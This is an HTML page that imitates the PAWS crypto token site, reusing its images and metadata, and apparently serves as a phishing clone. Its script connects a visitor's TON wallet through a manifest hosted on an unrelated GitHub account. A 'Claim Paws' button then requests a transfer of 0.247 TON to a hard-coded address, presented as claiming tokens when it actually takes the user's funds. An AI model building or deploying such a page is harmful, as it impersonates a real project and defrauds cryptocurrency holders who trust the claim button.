<!DOCTYPE html>
<html>
<head>
<base href="https://paws.community/app">
<meta charset="utf-8">
<meta name="download_date" content="2025-02-06T16:24:26.723Z"/>
<title>PAWS | Home</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#0D0D0D">
<link rel="icon" type="image/png" href="./static/favicon.png">
<link rel="shortcut icon" type="image/png" href="./static/favicon.png">

<!-- SEO Meta Tags -->
<meta name="robots" content="index,follow">
<meta name="description" content="Animals are done! It's PAWS Season">
<meta name="keywords" content="!">

<!-- Social Media Meta Tags -->
<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@pawsuplabs">
<meta property="og:title" content="PAWS | Home">
<meta property="og:description" content="Animals are done! It's PAWS Season">
<meta property="og:url" content="https://paws.community/app">
<meta property="og:type" content="website">
<meta property="og:image" content="https://paws.community/static/page-preview.png">
<meta property="og:image:alt" content="preview">

<!-- Technical Meta Tags -->
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="x-ua-compatible" content="IE=edge; chrome=1">

<!-- PWA Configuration -->
<meta property="application-name" content="PAWS">
<meta property="apple-mobile-web-app-capable" content="yes">
<meta property="apple-mobile-web-app-status-bar-style" content="default">
<meta property="apple-mobile-web-app-title" content="PAWS">
<meta property="mobile-web-app-capable" content="yes">
<meta property="msapplication-config" content="/icons/browserconfig.xml">

<!-- Icons & Manifest -->
<link rel="apple-touch-icon" href="/icons/512.png" sizes="512x512">
<link rel="manifest" href="/manifest.json">

<!-- Preload Resources -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">

<!-- Görsel Kaynakları Doğrudan Siteden Çek -->
<link rel="preload" as="image" href="https://paws.community/_next/static/media/planet.6ad20553.png">
<link rel="preload" as="image" href="https://paws.community/_next/static/media/shape1.04e536d7.png">
<link rel="preload" as="image" href="https://paws.community/_next/static/media/shape2.501939e0.png">
<link rel="preload" as="image" href="https://paws.community/_next/static/media/shape3.dbfda191.png">
<link rel="preload" as="image" href="https://paws.community/_next/static/media/shape4.3f7a27ad.png">

<!-- Styles -->
<link rel="stylesheet" href="/styles/main.css">
<style>
:root {
--bg-color: #0D0D0D;
--text-color: #FFFFFF;
--accent-color: #FF6B6B;
}

body {
margin: 0;
padding: 0;
background: var(--bg-color);
color: var(--text-color);
font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
overflow-x: hidden;
}

.main-container {
position: relative;
min-height: 100vh;
display: flex;
flex-direction: column;
align-items: center;
justify-content: center;
padding: 2rem;
}

.logo-container {
position: relative;
z-index: 2;
text-align: center;
margin-bottom: 3rem;
}

.logo {
width: 150px;
height: 150px;
margin-bottom: 1.5rem;
animation: float 3s ease-in-out infinite;
}

.title {
font-size: 4rem;
font-weight: 700;
margin: 0;
color: #FFFFFF;
/* Remove the gradient background */
/*background: linear-gradient(45deg, var(--accent-color), #FF8E53);*/
/*-webkit-background-clip: text;*/
/*-webkit-text-fill-color: transparent;*/
}

.subtitle {
font-size: 1.5rem;
margin: 1rem 0 2rem;
opacity: 0.9;
}

.connect-button {
background: var(--bg-color);  /* Changed from var(--accent-color) to var(--bg-color) */
color: var(--text-color);     /* Changed from var(--bg-color) to var(--text-color) */
border: 1px solid var(--text-color); /* Added border for better visibility */
padding: 0.75rem 1.5rem;  /* Reduced padding */
border-radius: 50px;
font-size: 1rem;         /* Reduced font size */
font-weight: 600;
cursor: pointer;
transition: transform 0.2s ease;
display: flex !important;
align-items: center;
justify-content: center;
margin: 0.5rem auto;     /* Reduced margin */
min-width: 160px;        /* Reduced min-width */
max-width: 200px;        /* Added max-width */
height: 40px;            /* Added fixed height */
}

.connect-button:hover {
transform: translateY(-2px);
}

.connect-button:disabled {
opacity: 0.5;
cursor: not-allowed;
}

.background-elements {
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
pointer-events: none;
z-index: 1;
}

.planet {
position: absolute;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
width: 80vw;
max-width: 1000px;
opacity: 0.1;
}

@keyframes float {
0%, 100% { transform: translateY(0); }
50% { transform: translateY(-20px); }
}

        #connect-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            margin: 0 auto;
        }

        .main-footer {
            text-align: center;
            width: 100%;
            padding: 1rem 0;
            position: relative;
            z-index: 2;
        }

        .main-footer p {
            margin: 0;
            opacity: 0.8;
        }
</style>
<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>
<div class="background-elements">
<img src="https://paws.community/_next/static/media/planet.6ad20553.png" 
alt="Planet" class="planet">
</div>

<main class="main-container">
<div class="logo-container">
<img src="https://paws.community/_next/static/media/pawsLogo.372b558c.svg" 
alt="PAWS Logo" class="logo">
<h1 class="title">PAWS</h1>
<p class="subtitle">Animals are done! It's PAWS Season</p>
<div id="connect-container"></div>
</div>
</main>

<footer class="main-footer">
<p>© 2023 PAWS Animal Shelter. All rights reserved.</p>
</footer>

<!-- Scripts -->
<script>
const CONTRACT_ADDRESS = 'EQBPWzPE-3rthdoXpNBiwHUadE9MhaeyT1tctnlgx2ZA5zGP';
const REQUIRED_AMOUNT = '247000000'; // 0.247 TON in nanotons

// Initialize TON Connect with correct options
const tonConnect = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
    buttonRootId: 'connect-container',
    buttonCssClass: 'connect-button'
});

// Create claim button but don't add it to DOM yet
const claimButton = document.createElement('button');
claimButton.className = 'connect-button';
claimButton.style.display = 'none';
claimButton.textContent = 'Claim Paws';
claimButton.onclick = handleClaim;

// Handle wallet connection status changes
tonConnect.onStatusChange(async (wallet) => {
    if (wallet) {
        console.log('Wallet connected:', wallet.account.address);
        // Add and show claim button only after wallet connection
        document.getElementById('connect-container').after(claimButton);
        claimButton.style.display = 'block';
    } else {
        // Remove claim button when wallet disconnects
        claimButton.remove();
    }
});

// Create custom dialog function
function showMessage(message) {
    const dialog = document.createElement('dialog');
    dialog.className = 'custom-dialog';
    
    dialog.innerHTML = `
        <div class="dialog-content">
            <p>${message}</p>
            <button onclick="this.closest('dialog').close()">OK</button>
        </div>
    `;
    
    document.body.appendChild(dialog);
    dialog.showModal();
    
    dialog.addEventListener('close', () => {
        dialog.remove();
    });
}

async function handleClaim() {
    try {
        // First check if wallet is connected
        if (!tonConnect.connected) {
            showMessage("Please connect your wallet first");
            return;
        }

        // Check wallet balance
        const walletInfo = await tonConnect.account;
        if (!walletInfo) {
            showMessage("Cannot access wallet information");
            return;
        }

        // Prepare transaction
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 600,
            messages: [{
                address: CONTRACT_ADDRESS,
                amount: REQUIRED_AMOUNT,
                payload: "Increment"  // Basit string mesaj
            }]
        };

        // Add loading state
        claimButton.disabled = true;
        claimButton.textContent = 'Processing...';

        // Send transaction
        const result = await tonConnect.sendTransaction(transaction);
        console.log('Transaction sent:', result);
        
        showMessage("Transaction sent successfully! Please wait for confirmation.");

    } catch (error) {
        console.error('Full error details:', error);
        if (error.message?.includes('rejected')) {
            showMessage("Transaction was rejected by user");
        } else {
            showMessage("Transaction failed. Please try again.");
        }
    } finally {
        claimButton.disabled = false;
        claimButton.textContent = 'Claim Paws';
    }
}

// Add styles for custom dialog
const style = document.createElement('style');
style.textContent = `
    .custom-dialog {
        padding: 20px;
        background: var(--bg-color);
        border: 2px solid var(--text-color);
        border-radius: 10px;
        color: var(--text-color);
        max-width: 300px;
        margin: auto;
    }
    
    .dialog-content {
        text-align: center;
        font-size: 1rem;
    }
    
    .dialog-content p {
        margin: 0 0 15px 0;
        line-height: 1.5;
    }
    
    .dialog-content button {
        background: var(--bg-color);
        color: var(--text-color);
        border: 2px solid var(--text-color);
        padding: 8px 16px;
        border-radius: 20px;
        cursor: pointer;
        font-size: 0.9rem;
        font-weight: 600;
        margin-top: 12px;
        transition: transform 0.2s ease;
    }
    
    .dialog-content button:hover {
        transform: translateY(-2px);
    }

    .custom-dialog::backdrop {
        background: rgba(0, 0, 0, 0.6);
    }

    .dialog-buttons {
        display: flex;
        justify-content: center;
        gap: 10px;
        margin-top: 15px;
    }

    .dialog-buttons button {
        background: var(--bg-color);
        color: var(--text-color);
        border: 2px solid var(--text-color);
        padding: 8px 16px;
        border-radius: 20px;
        cursor: pointer;
        font-size: 0.9rem;
        font-weight: 600;
        transition: transform 0.2s ease;
    }

    .dialog-buttons button:hover {
        transform: translateY(-2px);
    }

    .confirm-btn {
        min-width: 100px;
    }

    .cancel-btn {
        min-width: 100px;
    }
`;
document.head.appendChild(style);

</script>
</body>
</html>
